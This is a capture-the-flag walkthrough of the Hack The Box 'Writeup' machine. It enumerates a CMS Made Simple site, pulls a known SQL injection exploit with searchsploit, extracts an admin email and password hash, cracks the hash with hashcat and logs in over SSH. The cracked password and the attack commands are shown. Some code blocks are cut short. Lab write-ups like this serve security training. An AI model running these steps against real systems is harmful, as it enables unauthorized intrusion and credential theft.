# Enumeration

As usual, let's start with a simple ping of the server.

``` bash
â”Œâ”€â”€(rootðŸ’€bradman)-[/home/brad/HTB/Writeup]
â””â”€# ping -c 5 10.10.10.138

```

As like we did with [Bastion](/_posts/2021-07-14-bastion.md), let's look at the `ttl` and make a guestimate as to what we're attacking. We'll be using [subinsb.com](https://subinsb.com/default-device-ttl-values/), which shows that this is most likey a *nix machine.

We'll utilize [nmapper](https://github.com/ABradRoberts/nmapper/blob/master/src/nmapper.sh) and to enumerate this machine further.

We're only working with 2 ports, 22(ssh) and 80(http), that makes our jobs pretty easy because we know there has to be something in one of these, let's start with the web application on 80 because I love web apps - they're the modern day "binaries to reverse" but more fun.

We'll use FeroxBuster cause I'm freaking loving that tool!

[ 2 hours later ]

Well... sometimes it's good to just visit the webpage or `curl` it before trying a web fuzzing tool like this.... because we get the following:

``` bash
â”Œâ”€â”€(rootðŸ’€bradman)-[/home/brad/HTB/Writeup]
â””â”€# curl http://10.10.10.138                                                                                                              137 â¨¯

Prolly explains why feroxbuster was *crawling* and why gobuster just kept erroring out... lol... welp... LET'S DO IT LIVE!

Let's check for `robots.txt` this will tell us what the developers specifically want targetted by search engine web cralers. This can also be used to say which pages are "disallowed" from this list too. In our case, we see the following:

``` bash
â”Œâ”€â”€(rootðŸ’€bradman)-[/home/brad/HTB/Writeup]
â””â”€# curl http://10.10.10.138/robots.txt                           
#              __
#      _(\    |@@|
#     (__/\__ \--/ __
#        \___|----|  |   __
#            \ }{ /\ )_ / _\
#            /\__/\ \__O (__
#           (--/\--)    \__/
#           _)(  )(_
#          `---''---`

# Disallow access to the blog until content is finished.
User-agent: * 
Disallow: /writeup/
```

Okay, so they disallow `/writeup/` let's navigate there and see what it's housing.

<img alt="index.html" src="/img/hackthebox/writeup/writeup_index.png">

Looking around at this page there doesn't seem to be anything blaring at us, so let's look at the page source. Maybe there is something interesting in the html.

``` html
<!doctype html>
<html lang="en_US"><head>
	<title>Home - writeup</title>
	
<base href="http://10.10.10.138/writeup/" />
<meta name="Generator" content="CMS Made Simple - Copyright (C) 2004-2019. All rights reserved." />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

	<!-- cms_stylesheet error: No stylesheets matched the criteria specified -->

    <-- OMIT FOR BREVITY-->

```

Looks like it's using CMS, let's go ahead and run this through `searchsploit`.

Running `searchsploit cms` and `searchsploit cms made simple` yields a TON of results... we need to scope this down a little bit, we know that it's copyright 2004-2019, let's google and see what version came out in 2019. 

<img alt="googling" src="/img/hackthebox/writeup/google_version.png">

Well, we *should* go in and dig a little bit further but it appears that version 2.2.X keeps coming up for a search for the 2019 version. Let's use this to see if we can narrow down `searchsploit` more

``` bash
â”Œâ”€â”€(rootðŸ’€bradman)-[/home/brad/HTB/Writeup]
â””â”€# searchsploit cms made simple 2.2
---------------------------------------------------------------------- ---------------------------------

Shellcodes: No Results

```

Nice! Now we can really work with that. First thoughts looking at this - Remote Code execution would be AWESOME... buuut it's authenticated so I'm going to look at the SQL injection vulnerabilities first. We can nix the 1.2.2 version and jump straight into our 2.2.10 version.

We can copy this exploit using the `-m` flag in `searchsploit`!

``` bash
â”Œâ”€â”€(rootðŸ’€bradman)-[/home/brad/HTB/Writeup]
â””â”€# searchsploit -m php/webapps/46635.py -o sploit.py
  Exploit: CMS Made Simple < 2.2.10 - SQL Injection
      URL: https://www.exploit-db.com/exploits/46635
     Path: /opt/exploitdb/exploits/php/webapps/46635.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /home/brad/HTB/Writeup/sploit.py


â”Œâ”€â”€(rootðŸ’€bradman)-[/home/brad/HTB/Writeup]
â””â”€# ls
sploit.py  nmap
```

I would HIGHLY recommend reading through the code and getting a fairly solid understanding of how it works and what it does before actually executing - I'd say I spent about 30 minutes reading this before actually executing this on MY machine.
(also this code is freaking cool.... reading it is.. meh.. but seeing it work and then re-reading it is super cool, literally feels like a 90's hacker movie... let's be honest... even modern hacker movies :/ )

# Exploitation
---

We run the exploit code in the following manner and wait like 5 minutes then get the below result:

``` bash
â”Œâ”€â”€(rootðŸ’€bradman)-[/home/brad/HTB/Writeup]
â””â”€# python2 sploit.py -u http://10.10.10.138/writeup/

[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
```

We got a password and the salt... let's combine these and run it through `hashcat`:

``` bash
â”Œâ”€â”€(rootðŸ’€bradman)-[/home/brad/HTB/Writeup]
â””â”€# echo "62def4866937f08cc13bab43bb14e6f7:5a599ef579066807" >> hash.txt

We cracked the password! It's `raykayjay9`, let's use this to ssh into the server as `jkr` like we found above.

``` bash
â”Œâ”€â”€(rootðŸ’€bradman)-[/home/brad/HTB/Writeup]
â””â”€# ssh jkr@10.10.10.138
